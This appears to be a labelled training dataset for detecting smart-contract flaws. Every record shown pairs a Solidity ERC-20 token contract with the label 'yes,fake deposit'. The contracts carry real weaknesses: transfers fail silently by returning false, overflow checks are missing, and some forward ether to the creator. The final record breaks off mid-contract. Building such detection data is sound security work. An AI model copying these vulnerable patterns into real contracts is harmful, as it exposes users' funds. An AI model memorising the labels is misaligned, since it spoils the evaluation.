{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 9900000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 9900000000000000000000000000; // Update total supply (100000 for example)\n name = \"Fenny Penny\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals\n symbol = \"FPN\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.9.0;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract HARAMBUCKS is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function HARAMBUCKS(\n ) {\n balances[msg.sender] = 6942000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 6942000000; // Update total supply (100000 for example)\n name = \"HARAMBUCKS\"; // Set the name for display purposes\n decimals = 5; // Amount of decimals for display purposes\n symbol = \"MONKE\"; // Set the symbol for display purposes\n \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract NFTChampions is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000*10**uint256(decimals);\n string public constant name = \"NFT Champions\";\n string public constant symbol = \"CHAMP\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Ethereum_Kiwi is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Ethereum Kiwi\";\n string public constant symbol = \"EKIWI \ud83e\udd5d\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 50000000; // Update total supply (100000 for example)\n name = \"IonicTransfertToken\"; // Set the name for display purposes\n decimals = 0; // Amount of decimals for display purposes\n symbol = \"ITT\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract Shepherd is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'Shepherd.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function Shepherd() {\n balances[msg.sender] = 10000000000000000000000000000; \n totalSupply = 10000000000000000000000000000;\n name = \"Shepherd\";\n decimals = 18; \n symbol = \"Shepherd\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 10000000000000000000000000000000; // Update total supply (100000 for example)\n name = \"Dalgona\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"DALGONA\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'SnowShibaInu' token contract\n//\n// Symbol : SNOWINU \u2744\ufe0f\n// Name : Snow Shiba Inu\n// Total supply: 100000000000000\n// Decimals : 18\n//\n// TOTAL SUPPLY 1,000,000,000,000,000\n// 50% Burned\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract SnowShibaInu is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Snow Shiba Inu\";\n string public constant symbol = \"SNOWINU \u2744\ufe0f\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract HotaruInu is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Hotaru Inu\";\n string public constant symbol = \"HOTARU\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract CryptoCasinoToken is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Crypto Casino Token\";\n string public constant symbol = \"CRYCAS\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= 